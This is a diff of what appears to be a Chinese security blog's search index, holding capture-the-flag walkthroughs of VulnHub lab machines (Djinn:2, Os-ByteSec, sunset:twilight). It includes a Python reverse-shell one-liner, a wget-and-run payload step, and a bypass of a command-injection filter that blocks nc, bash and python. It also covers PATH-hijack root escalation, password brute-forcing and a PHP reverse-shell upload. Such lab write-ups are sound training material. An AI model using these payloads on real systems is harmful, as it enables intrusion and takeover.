-<img src="Djinn:2/image-20200720163953505.png" alt="image-20200720163953505" style="zoom:25%;" />
-
-<p>给权限<code>chmod+777+/tmp/a.sh</code></p>
-<p>本地监听，运行<code>/tmp/a.sh</code>，得到一个反弹shell</p>
-<img src="Djinn:2/image-20200720164216528.png" alt="image-20200720164216528" style="zoom:33%;" />
-
-
-
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在<code>/var/backups</code>目录下发现一个<code>nite.kdbx</code>文件</p>
-<img src="Djinn:2/image-20200720164518318.png" alt="image-20200720164518318" style="zoom:33%;" />
-
-<p><code>.kdbx</code>文件介绍：</p>
-<img src="Djinn:2/image-20200720164659679.png" alt="image-20200720164659679" style="zoom:50%;" />
-
-<p>所以需要使用<code>KeePass</code>打开呗，打开之后要密码</p>
-<p>输入在ftp找到的那个密码，得到<code>nitish</code>的密码<code>&amp;HtMGd$LJB</code></p>
-<img src="Djinn:2/image-20200720164934744.png" alt="image-20200720164934744" style="zoom:33%;" />
-
-
-
-<p>使用ssh连接，找一下能提权的玩意</p>
-<img src="Djinn:2/image-20200720165226436.png" alt="image-20200720165226436" style="zoom:50%;" />
-
-<p>找到一封邮件，可惜看不了</p>
-<p><code>netstat -ano | grep &quot;LISTEN&quot; | grep &quot;127&quot;</code>，发现还开了两个端口</p>
-<img src="Djinn:2/image-20200720165849066.png" alt="image-20200720165849066" style="zoom:50%;" />
-
-<p>nc过去看一下</p>
-<img src="Djinn:2/image-20200720170004332.png" alt="image-20200720170004332" style="zoom:33%;" />
-
-
-
-<p>命令5 6 存在命令注入</p>
-<img src="Djinn:2/image-20200720170148396.png" alt="image-20200720170148396" style="zoom:25%;" />
-
-<p>那就把之前的反弹shell写进去，得到一个shell</p>
-<img src="Djinn:2/image-20200720170448502.png" alt="image-20200720170448502" style="zoom:33%;" />
-
-<p>看一下那一封邮件，</p>
-<img src="Djinn:2/image-20200720170705839.png" alt="image-20200720170705839" style="zoom:33%;" />
-
-<p>在<code>ugtan</code>的某个目录下创建一个<code>clean.sh</code>即可</p>
-<img src="Djinn:2/image-20200720170928863.png" alt="image-20200720170928863" style="zoom:33%;" />
-
-
-
-<p>然后等一会儿就会收到shell</p>
-<img src="Djinn:2/image-20200720171355897.png" alt="image-20200720171355897" style="zoom:50%;" />
-
-]]></content>
-      <categories>
-        <category>exploit</category>
-        <category>Djinn</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>RCE</tag>
-        <tag>command-injection</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>vulnhub Djinn:1靶机</title>
     <url>//Djinn-1.html</url>
     <content><![CDATA[<p>vulnhub里的 Djinn:1 靶机</p>
@@ -792,8 +681,119 @@
       </categories>
       <tags>
         <tag>exploit</tag>
-        <tag>command-injection</tag>
         <tag>ftp</tag>
+        <tag>command-injection</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulnhub Djinn:2靶机</title>
+    <url>//Djinn-2.html</url>
+    <content><![CDATA[<p>vulnhub里的 Djinn:2 靶机</p>
+<p>中等难度</p>
+<a id="more"></a>
+
+
+
+<h1 id="Djinn-2"><a href="#Djinn-2" class="headerlink" title="Djinn:2"></a>Djinn:2</h1><img src="Djinn:2/image-20200720161617553.png" alt="image-20200720161617553" style="zoom:50%;" />
+
+
+
+<p>开启了<code>21 22 1337 5000 7331</code>端口</p>
+<p>其中<code>1337端口</code> 也是一个小游戏，这回没有去玩（之后可以试试）</p>
+<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>老三样</p>
+<img src="Djinn:2/image-20200720164826449.png" alt="image-20200720164826449" style="zoom:50%;" />
+
+<p>这玩意很像是密码？但是ssh不对（在后面用到了）</p>
+<h2 id="7331"><a href="#7331" class="headerlink" title="7331"></a>7331</h2><p>7331端口访问之后还是老样子</p>
+<img src="Djinn:2/image-20200720162014809.png" alt="image-20200720162014809" style="zoom:50%;" />
+
+<p><code>/wish</code>已经修复</p>
+<img src="Djinn:2/image-20200720162039152.png" alt="image-20200720162039152" style="zoom:33%;" />
+
+
+
+<p><code>robots.txt</code>里面只写了一个<code>/letshack</code>（并没有什么卵用）</p>
+<p>目录扫描还有一个<code>/source</code></p>
+<p>下载下来之后是一个python文件</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://&#123;&#125;:5000/?username=&#123;&#125;&amp;password=&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_ip</span>(<span class="params">ip: <span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check whether the input IP is valid or not</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">r&#x27;^(?:(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])&#x27;</span></span><br><span class="line">                <span class="string">&#x27;(\.(?!$)|$))&#123;4&#125;$&#x27;</span>, ip):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catcher</span>(<span class="params">host, username, password</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = URL.<span class="built_in">format</span>(host, username, password)</span><br><span class="line">        requests.post(url)</span><br><span class="line">        sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">&quot;Unable to connect to the server!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    print(<span class="string">&quot;If you have this then congratulations on being a part of an awesome organization&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;This key will help you in connecting to our system securely.&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;If you find any issue please report it to ugtan@djinn.io&quot;</span>)</span><br><span class="line">    ip = <span class="built_in">input</span>(<span class="string">&#x27;\nIP of the machine: &#x27;</span>)</span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&#x27;Your username: &#x27;</span>)</span><br><span class="line">    password = <span class="built_in">input</span>(<span class="string">&#x27;Your password: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">and</span> check_ip(ip) <span class="keyword">and</span> username == <span class="string">&quot;REDACTED&quot;</span> <span class="keyword">and</span> password == <span class="string">&quot;REDACTED&quot;</span>:</span><br><span class="line">        print(<span class="string">&quot;Verifiying %s with host %s &quot;</span> % (username, ip))</span><br><span class="line">        catcher(ip, username, password)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Invalid IP address given&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>那估计考点就是5000端口了</p>
+<h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p>分析source文件可知 5000端口用的是post方法，尝试抓个包</p>
+<img src="Djinn:2/image-20200720163202232.png" alt="image-20200720163202232" style="zoom:50%;" />
+
+<p>在<code>username</code>变量存在<code>RCE</code></p>
+<img src="Djinn:2/image-20200720163255638.png" alt="image-20200720163255638" style="zoom:50%;" />
+
+<p><strong>app.py</strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&quot;key&quot;</span></span><br><span class="line"></span><br><span class="line">RCE = [<span class="string">&quot;|&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;nc&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;bin&quot;</span>, <span class="string">&quot;eval&quot;</span>,  <span class="string">&quot;python&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> RCE:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> cmd:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    command = request.args.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> validate(command):</span><br><span class="line">        output = subprocess.Popen(command, shell=<span class="literal">True</span>,</span><br><span class="line">                                  stdout=subprocess.PIPE).stdout.read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output = <span class="string">&quot;Access Denied!!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>看样子过滤了一些命令，可以用wget上传文件来绕过</p>
+<p>使用的payload为(因为靶机上面的nc 没有<code>-e</code>参数，python版本为<code>python3</code>)</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.143&quot;, 9900));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用<code>wget+-O+/tmp/a.sh+http://192.168.2.143/shell</code></p>
+<img src="Djinn:2/image-20200720163942603.png" alt="image-20200720163942603" style="zoom:25%;" />
+
+<img src="Djinn:2/image-20200720163953505.png" alt="image-20200720163953505" style="zoom:25%;" />
+
+<p>给权限<code>chmod+777+/tmp/a.sh</code></p>
+<p>本地监听，运行<code>/tmp/a.sh</code>，得到一个反弹shell</p>
+<img src="Djinn:2/image-20200720164216528.png" alt="image-20200720164216528" style="zoom:33%;" />
+
+
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在<code>/var/backups</code>目录下发现一个<code>nite.kdbx</code>文件</p>
+<img src="Djinn:2/image-20200720164518318.png" alt="image-20200720164518318" style="zoom:33%;" />
+
+<p><code>.kdbx</code>文件介绍：</p>
+<img src="Djinn:2/image-20200720164659679.png" alt="image-20200720164659679" style="zoom:50%;" />
+
+<p>所以需要使用<code>KeePass</code>打开呗，打开之后要密码</p>
+<p>输入在ftp找到的那个密码，得到<code>nitish</code>的密码<code>&amp;HtMGd$LJB</code></p>
+<img src="Djinn:2/image-20200720164934744.png" alt="image-20200720164934744" style="zoom:33%;" />
+
+
+
+<p>使用ssh连接，找一下能提权的玩意</p>
+<img src="Djinn:2/image-20200720165226436.png" alt="image-20200720165226436" style="zoom:50%;" />
+
+<p>找到一封邮件，可惜看不了</p>
+<p><code>netstat -ano | grep &quot;LISTEN&quot; | grep &quot;127&quot;</code>，发现还开了两个端口</p>
+<img src="Djinn:2/image-20200720165849066.png" alt="image-20200720165849066" style="zoom:50%;" />
+
+<p>nc过去看一下</p>
+<img src="Djinn:2/image-20200720170004332.png" alt="image-20200720170004332" style="zoom:33%;" />
+
+
+
+<p>命令5 6 存在命令注入</p>
+<img src="Djinn:2/image-20200720170148396.png" alt="image-20200720170148396" style="zoom:25%;" />
+
+<p>那就把之前的反弹shell写进去，得到一个shell</p>
+<img src="Djinn:2/image-20200720170448502.png" alt="image-20200720170448502" style="zoom:33%;" />
+
+<p>看一下那一封邮件，</p>
+<img src="Djinn:2/image-20200720170705839.png" alt="image-20200720170705839" style="zoom:33%;" />
+
+<p>在<code>ugtan</code>的某个目录下创建一个<code>clean.sh</code>即可</p>
+<img src="Djinn:2/image-20200720170928863.png" alt="image-20200720170928863" style="zoom:33%;" />
+
+
+
+<p>然后等一会儿就会收到shell</p>
+<img src="Djinn:2/image-20200720171355897.png" alt="image-20200720171355897" style="zoom:50%;" />
+
+]]></content>
+      <categories>
+        <category>exploit</category>
+        <category>Djinn</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>command-injection</tag>
+        <tag>RCE</tag>
       </tags>
   </entry>
   <entry>
@@ -889,8 +889,8 @@
       </categories>
       <tags>
         <tag>exploit</tag>
-        <tag>RCE</tag>
         <tag>command-injection</tag>
+        <tag>RCE</tag>
       </tags>
   </entry>
   <entry>
@@ -979,83 +979,6 @@
       <tags>
         <tag>exploit</tag>
         <tag>opennetadmin</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vulnhub hacks:Os-ByteSec靶机</title>
-    <url>//Os-ByteSec.html</url>
-    <content><![CDATA[<p>vulnhub里的 nezikochan 靶机</p>
-<p>中等难度</p>
-<a id="more"></a>
-
-
-
-<h1 id="Os-ByteSec"><a href="#Os-ByteSec" class="headerlink" title="Os-ByteSec"></a>Os-ByteSec</h1><p>主机扫描/端口扫描</p>
-<p>开启了<code>80 139 445 2525</code>端口</p>
-<p>其中2525端口是ssh，139和445端口是smb</p>
-<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>什么都没有，扫描目录也没有啥东西</p>
-<img src="hacknos:Os-ByteSec/image-20200722142948147.png" alt="image-20200722142948147" style="zoom:50%;" />
-
-<p>只有最下面提示<code>smb</code></p>
-<h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><p>使用<code>enum4linux</code>枚举一下目标靶机的账户</p>
-<p><code>enum4linux -U 192.168.2.174</code></p>
-<img src="hacknos:Os-ByteSec/image-20200722143305838.png" alt="image-20200722143305838" style="zoom:50%;" />
-
-<p>得到了一个名为<code>smb</code>的用户</p>
-<p>使用<code>msf</code>的<code>auxiliary/scanner/smb/smb_login </code>模块去爆破密码</p>
-<img src="hacknos:Os-ByteSec/image-20200722143604720.png" alt="image-20200722143604720" style="zoom:50%;" />
-
-<p>（其实推荐用<code>fastattack.txt</code>字典）</p>
-<p>得到了密码为空</p>
-<img src="hacknos:Os-ByteSec/image-20200722143630970.png" alt="image-20200722143630970" style="zoom:50%;" />
-
-<p>使用<code>smbclient</code>登录smb</p>
-<img src="hacknos:Os-ByteSec/image-20200722143725552.png" alt="image-20200722143725552" style="zoom:50%;" />
-
-<p>发现并没有啥东西？？？</p>
-<p>（翻了参考答案）</p>
-<p>发现在<code>192.168.2.174/smb</code>目录下有东西（为什么？）</p>
-<img src="hacknos:Os-ByteSec/image-20200722143822912.png" alt="image-20200722143822912" style="zoom:50%;" />
-
-<p>下载下来之后，<code>main.txt</code>没东西，<code>safe.zip</code>需要密码</p>
-<h2 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h2><p>使用<code>fcrackzip</code>破解</p>
-<img src="hacknos:Os-ByteSec/image-20200722144000639.png" alt="image-20200722144000639" style="zoom:50%;" />
-
-<p>得到了密码</p>
-<p>解压之后得到一个<code>.cap</code>（流量包），使用<code>wireshark</code>分析之后发现是一个无线流量包（参考答案说的）</p>
-<h2 id="aircrack-ng"><a href="#aircrack-ng" class="headerlink" title="aircrack-ng"></a>aircrack-ng</h2><p>使用<code>aircrack-ng</code>破解</p>
-<img src="hacknos:Os-ByteSec/image-20200722144157918.png" alt="image-20200722144157918" style="zoom:50%;" />
-
-<p>破解之后得到了<code>blackjax</code>用户和密码</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>使用ssh连接，目录下面有一个<code>user.txt</code>，是一个flag</p>
-<p>然后找提权的东西</p>
-<p><code>find -perm -u=s -type f 2&gt;/dev/null</code></p>
-<img src="hacknos:Os-ByteSec/image-20200722144457227.png" alt="image-20200722144457227" style="zoom:50%;" />
-
-<p>发现这个<code>netscan</code>（别人的解题步骤上面直接说可疑然后一眼看出来该怎么做我是没想到的）</p>
-<p>使用<code>cat</code>命令查看一下是什么类型文件</p>
-<img src="hacknos:Os-ByteSec/image-20200722144617102.png" alt="image-20200722144617102" style="zoom:50%;" />
-
-<p>看这个文件头，是一个可执行文件（不是shell脚本）</p>
-<p>使用ida(32位)反编译</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  setgid(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;netstat -antp&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到这个文件直接运行了<code>netstat</code>命令</p>
-<p>根据Linux命令的特性，使用<code>export PATH=/tmp:$PATH</code>劫持path，然后创建<code>/tmp/netstat</code>文件，这样运行<code>netscan</code>的时候会运行<code>/tmp/netstat</code>程序。</p>
-<img src="hacknos:Os-ByteSec/image-20200722144949356.png" alt="image-20200722144949356" style="zoom:50%;" />
-
-<p>并且使用<code>chmod 777 /tmp/netstat</code>给权限</p>
-<img src="hacknos:Os-ByteSec/image-20200722145130078.png" alt="image-20200722145130078" style="zoom:50%;" />
-
-<p>得到了root权限</p>
-]]></content>
-      <categories>
-        <category>exploit</category>
-        <category>hacknos</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>smb</tag>
       </tags>
   </entry>
   <entry>
@@ -1153,6 +1076,83 @@
       <tags>
         <tag>exploit</tag>
         <tag>wordpress</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulnhub hacks:Os-ByteSec靶机</title>
+    <url>//Os-ByteSec.html</url>
+    <content><![CDATA[<p>vulnhub里的 nezikochan 靶机</p>
+<p>中等难度</p>
+<a id="more"></a>
+
+
+
+<h1 id="Os-ByteSec"><a href="#Os-ByteSec" class="headerlink" title="Os-ByteSec"></a>Os-ByteSec</h1><p>主机扫描/端口扫描</p>
+<p>开启了<code>80 139 445 2525</code>端口</p>
+<p>其中2525端口是ssh，139和445端口是smb</p>
+<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>什么都没有，扫描目录也没有啥东西</p>
+<img src="hacknos:Os-ByteSec/image-20200722142948147.png" alt="image-20200722142948147" style="zoom:50%;" />
+
+<p>只有最下面提示<code>smb</code></p>
+<h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><p>使用<code>enum4linux</code>枚举一下目标靶机的账户</p>
+<p><code>enum4linux -U 192.168.2.174</code></p>
+<img src="hacknos:Os-ByteSec/image-20200722143305838.png" alt="image-20200722143305838" style="zoom:50%;" />
+
+<p>得到了一个名为<code>smb</code>的用户</p>
+<p>使用<code>msf</code>的<code>auxiliary/scanner/smb/smb_login </code>模块去爆破密码</p>
+<img src="hacknos:Os-ByteSec/image-20200722143604720.png" alt="image-20200722143604720" style="zoom:50%;" />
+
+<p>（其实推荐用<code>fastattack.txt</code>字典）</p>
+<p>得到了密码为空</p>
+<img src="hacknos:Os-ByteSec/image-20200722143630970.png" alt="image-20200722143630970" style="zoom:50%;" />
+
+<p>使用<code>smbclient</code>登录smb</p>
+<img src="hacknos:Os-ByteSec/image-20200722143725552.png" alt="image-20200722143725552" style="zoom:50%;" />
+
+<p>发现并没有啥东西？？？</p>
+<p>（翻了参考答案）</p>
+<p>发现在<code>192.168.2.174/smb</code>目录下有东西（为什么？）</p>
+<img src="hacknos:Os-ByteSec/image-20200722143822912.png" alt="image-20200722143822912" style="zoom:50%;" />
+
+<p>下载下来之后，<code>main.txt</code>没东西，<code>safe.zip</code>需要密码</p>
+<h2 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h2><p>使用<code>fcrackzip</code>破解</p>
+<img src="hacknos:Os-ByteSec/image-20200722144000639.png" alt="image-20200722144000639" style="zoom:50%;" />
+
+<p>得到了密码</p>
+<p>解压之后得到一个<code>.cap</code>（流量包），使用<code>wireshark</code>分析之后发现是一个无线流量包（参考答案说的）</p>
+<h2 id="aircrack-ng"><a href="#aircrack-ng" class="headerlink" title="aircrack-ng"></a>aircrack-ng</h2><p>使用<code>aircrack-ng</code>破解</p>
+<img src="hacknos:Os-ByteSec/image-20200722144157918.png" alt="image-20200722144157918" style="zoom:50%;" />
+
+<p>破解之后得到了<code>blackjax</code>用户和密码</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>使用ssh连接，目录下面有一个<code>user.txt</code>，是一个flag</p>
+<p>然后找提权的东西</p>
+<p><code>find -perm -u=s -type f 2&gt;/dev/null</code></p>
+<img src="hacknos:Os-ByteSec/image-20200722144457227.png" alt="image-20200722144457227" style="zoom:50%;" />
+
+<p>发现这个<code>netscan</code>（别人的解题步骤上面直接说可疑然后一眼看出来该怎么做我是没想到的）</p>
+<p>使用<code>cat</code>命令查看一下是什么类型文件</p>
+<img src="hacknos:Os-ByteSec/image-20200722144617102.png" alt="image-20200722144617102" style="zoom:50%;" />
+
+<p>看这个文件头，是一个可执行文件（不是shell脚本）</p>
+<p>使用ida(32位)反编译</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  setgid(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;netstat -antp&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这个文件直接运行了<code>netstat</code>命令</p>
+<p>根据Linux命令的特性，使用<code>export PATH=/tmp:$PATH</code>劫持path，然后创建<code>/tmp/netstat</code>文件，这样运行<code>netscan</code>的时候会运行<code>/tmp/netstat</code>程序。</p>
+<img src="hacknos:Os-ByteSec/image-20200722144949356.png" alt="image-20200722144949356" style="zoom:50%;" />
+
+<p>并且使用<code>chmod 777 /tmp/netstat</code>给权限</p>
+<img src="hacknos:Os-ByteSec/image-20200722145130078.png" alt="image-20200722145130078" style="zoom:50%;" />
+
+<p>得到了root权限</p>
+]]></content>
+      <categories>
+        <category>exploit</category>
+        <category>hacknos</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>smb</tag>
       </tags>
   </entry>
   <entry>
@@ -1305,55 +1305,6 @@
       </tags>
   </entry>
   <entry>
-    <title>vulnhub sunset:twilight靶机</title>
-    <url>//sunset-twilight.html</url>
-    <content><![CDATA[<p>Vulnhub sunset系列</p>
-<a id="more"></a>
-
-<h1 id="sunset-Twilight"><a href="#sunset-Twilight" class="headerlink" title="sunset:Twilight"></a>sunset:Twilight</h1><ul>
-<li>靶机ip: <code>192.168.6.129</code></li>
-<li>kali ip: <code>192.168.6.128</code></li>
-</ul>
-<h2 id="端口扫描结果"><a href="#端口扫描结果" class="headerlink" title="端口扫描结果"></a>端口扫描结果</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 43:e9:45:ec:f4:5b:ed:e9:64:47:43:43:39:96:9d:c9 (RSA)</span><br><span class="line">|   256 ed:67:ad:31:04:17:ef:cf:75:02:05:db:88:94:97:a0 (ECDSA)</span><br><span class="line">|_  256 ed:41:e5:d1:b2:23:2c:d5:90:59:2a:37:8b:da:31:c1 (ED25519)</span><br><span class="line">25/tcp    open  smtp        Exim smtpd 4.92</span><br><span class="line">| smtp-commands: twilight Hello nmap.scanme.org [192.168.6.128], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, </span><br><span class="line">|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP </span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)</span><br><span class="line">2121/tcp  open  ftp         pyftpdlib 1.5.6</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--   1 root     root           35 Jul 16 12:21 22253251-65325.twilight</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|  Connected to: 192.168.6.129:2121</span><br><span class="line">|  Waiting for username.</span><br><span class="line">|  TYPE: ASCII; STRUcture: File; MODE: Stream</span><br><span class="line">|  Data connection closed.</span><br><span class="line">|_End of status.</span><br><span class="line">3306/tcp  open  mysql       MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1</span><br><span class="line">|   Thread ID: 38</span><br><span class="line">|   Capabilities flags: 63486</span><br><span class="line">|   Some Capabilities: InteractiveClient, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsTransactions, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsCompression, SupportsLoadDataLocal, ODBCClient, IgnoreSigpipes, LongColumnFlag, FoundRows, Support41Auth, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: KGa5#NB&lt;G/R4L_w\H0YO</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">8080/tcp  open  http        PHP cli server 5.5 or later</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Login - powered by Easy File Sharing Web Server</span><br><span class="line">63525/tcp open  http        PHP cli server 5.5 or later</span><br><span class="line">|_http-title: Login - powered by Easy File Sharing Web Server</span><br><span class="line">MAC Address: 00:0C:29:16:3E:01 (VMware)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></pre></td></tr></table></figure>
-
-<p>大致上开启了 <code>80(http)</code> <code>2121(ftp)</code> 端口</p>
-<h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://i.loli.net/2020/09/15/6sczx1kGXMPto7j.png" alt="image-20200915001829728"></p>
-<p>点击<code>pictures</code></p>
-<p><img src="https://i.loli.net/2020/09/15/gJoG9OAPnryvs3U.png" alt="image-20200915001902578"></p>
-<p>以为是<code>sql注入</code>结果手动尝试，并且<code>sqlmap</code>也测试了，并没有注入</p>
-<p><img src="https://i.loli.net/2020/09/15/1jLMHD6zTXm9iV4.png" alt="image-20200915001948217"></p>
-<h3 id="另辟蹊径"><a href="#另辟蹊径" class="headerlink" title="另辟蹊径"></a>另辟蹊径</h3><p>使用<code>dirb</code> 工具扫描网站目录</p>
-<p><img src="https://i.loli.net/2020/09/15/PBzlk1anFNH2Vi5.png" alt="image-20200915002033766"></p>
-<p>找到了这个目录，访问之后是文件上传</p>
-<p>由于没有检查文件后缀名，使用<code>burpsuite</code>抓包绕过检测，成功上传文件，一个<code>php_reverse_shell</code></p>
-<p><img src="https://i.loli.net/2020/09/15/lxBjwWnz5ZLuSky.png" alt="image-20200915002228601"></p>
-<p>通过目录扫描的结果可以得到文件上传的路径<code>http://192.168.6.129/gallery/original/ </code></p>
-<p>访问之后得到shell</p>
-<p><img src="https://i.loli.net/2020/09/15/ktvmBYsoruIbJyX.png" alt="image-20200915002345152"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找能提权的东西，找<code>setuid</code>权限的</p>
